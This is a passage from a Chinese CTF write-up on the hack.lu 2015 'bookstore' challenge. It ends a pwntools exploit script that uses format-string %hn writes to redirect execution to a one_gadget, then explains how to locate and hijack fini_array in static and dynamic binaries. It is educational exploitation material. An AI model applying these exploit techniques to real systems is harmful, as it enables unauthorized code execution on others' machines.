free(2)

# 处理格式化字符串填充字节数，处理高地址值小于低地址情况
one_1 = onegadget & 0xffff
log.info("one_1:"+hex(one_1))
one_2 = onegadget>>16 & 0xffff
log.info("one_2:"+hex(one_2))
if one_1 > one_2:
    one_2 = one_2 + 0x10000 - one_1
else:
    one_2 -= one_1

# 修改第二次main返回地址
payload4 = "%{}c%13$hn".format(one_1) + "%{}c%14$hn".format(one_2)
payload4 = payload4.ljust(0x74,'c').ljust(0x88,'\x00')
payload4 += p64(0x151)
edit(1,payload4)
#gdb.attach(p)
payload3 = '5'*8 + p64(attack_addr) + p64(attack_addr+2)
p.recvuntil("5: Submit\n")

p.sendline(payload3)

p.interactive()
```

### 参考文章

* [hack.lu 2015 bookstore writeup](https://bbs.pediy.com/thread-246783.htm)
* [2015-hacklu-bookstore](https://blog.csdn.net/qq_43449190/article/details/89077783)

### 补充总结

##### 怎么找 fini_array ？

首先 fini_array 是 \_\_libc_csu_fini 函数里面会用的一个列表，当程序退出时会调用这个数组存放的一个或两个函数，调用完成后才继续完成退出函数，这时才是真正退出程序。

###### 64 位静态链接程序

fini_array 数组长度为 0x10 字节，里面放了两个函数地址，退出 main 函数会先执行 fini_array[1] ，然后执行 fini_array[0] 。

在[劫持 64 位静态程序 fini_array 进行 ROP 攻击](https://www.mrskye.cn/archives/173)里面接触的是 64 位静态编译的程序，程序是没有符号表的，寻找 fini_array 方法是：

首先 ``readelf -h 程序名`` 查看程序加载入口地址。

gdb 调试将断点打在入口地址 ，然后找到有三个传参的 mov 指令，mov r8 就是 \_\_libc_csu_fini 的地址：

```shell
.text:0000000000401A60                 public start
.text:0000000000401A60 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o
.text:0000000000401A60 ; __unwind {
.text:0000000000401A60                 xor     ebp, ebp
.text:0000000000401A62                 mov     r9, rdx
.text:0000000000401A65                 pop     rsi
.text:0000000000401A66                 mov     rdx, rsp
.text:0000000000401A69                 and     rsp, 0FFFFFFFFFFFFFFF0h
.text:0000000000401A6D                 push    rax
.text:0000000000401A6E                 push    rsp
.text:0000000000401A6F                 mov     r8, offset sub_402BD0 ; fini
.text:0000000000401A76                 mov     rcx, offset loc_402B40 ; init
.text:0000000000401A7D                 mov     rdi, offset main
.text:0000000000401A84                 db      67h
.text:0000000000401A84                 call    __libc_start_main
.text:0000000000401A8A                 hlt
.text:0000000000401A8A ; } // starts at 401A60
.text:0000000000401A8A start           endp
```

然后 ``x /20i addr`` 查看该地址开始的汇编，找到 ``lea    rbp,[rip+0xb***1] # 0x4***f0`` ，这个地址就是 fini_array[1] 的地址：

```shell
pwndbg> x/20i 0x402bd0
  0x402bd0 <__libc_csu_fini>:    push   rbp
  0x402bd1 <__libc_csu_fini+1>:    lea    rax,[rip+0xb24e8]        # 0x4***c0 
  0x402bd8 <__libc_csu_fini+8>:    lea    rbp,[rip+0xb24d1]        # 0x4***b0 
  0x402bdf <__libc_csu_fini+15>:    push   rbx
  0x402be0 <__libc_csu_fini+16>:    sub    rax,rbp
  0x402be3 <__libc_csu_fini+19>:    sub    rsp,0x8
  0x402be7 <__libc_csu_fini+23>:    sar    rax,0x3
  0x402beb <__libc_csu_fini+27>:    je     0x402c06 <__libc_csu_fini+54>
  0x402bed <__libc_csu_fini+29>:    lea    rbx,[rax-0x1]
  0x402bf1 <__libc_csu_fini+33>:    nop    DWORD PTR [rax+0x0]
  0x402bf8 <__libc_csu_fini+40>:    call   QWORD PTR [rbp+rbx*8+0x0]
  0x402bfc <__libc_csu_fini+44>:    sub    rbx,0x1
  0x402c00 <__libc_csu_fini+48>:    cmp    rbx,0xffffffffffffffff
  0x402c04 <__libc_csu_fini+52>:    jne    0x402bf8 <__libc_csu_fini+40>
  0x402c06 <__libc_csu_fini+54>:    add    rsp,0x8
  0x402c0a <__libc_csu_fini+58>:    pop    rbx
  0x402c0b <__libc_csu_fini+59>:    pop    rbp
  0x402c0c <__libc_csu_fini+60>:    jmp    0x48f52c <_fini>
```

###### 64 位动态链接程序

fini_array 数组长度为 0x8 字节，里面放了一个函数地址，退出 main 函数会执行 fini_array[0]。

gdb 输入 ``elf`` 找 ``.fini_array`` ，开始地址就是 fini_array[0] 

![](https://mrskye.cn-gd.ufileos.com/img/2020-08-06-qQxmRkH3KtjuybNr.png)

或者 IDA ``ctrl+s`` 找 .fini_array 分段 ：

![](https://mrskye.cn-gd.ufileos.com/img/2020-08-06-ztIjbG96doGOhSfu.png)

64 位中只有 fini_array[0] ，没有 fini_array[1] ，也就是只能运行写入 fini_array 一次，然后就正常退出了。无法像静态编译那样重复调用。

###### 静态动态利用方式小结

动态程序目前就遇到 ``2015 hacklu bookstore`` 这一题，太菜了总结不出规律。

静态程序基本上套路是劫持 fini_array + 循环写入，将 ROP 链布置到 fini_array + 0x10 ，写入完成后将栈迁移到 fini_array + 0x10 执行 ROP 链。静态程序的总结可以看看[淇淇师傅文章](https://www.freebuf.com/articles/system/226003.html)。

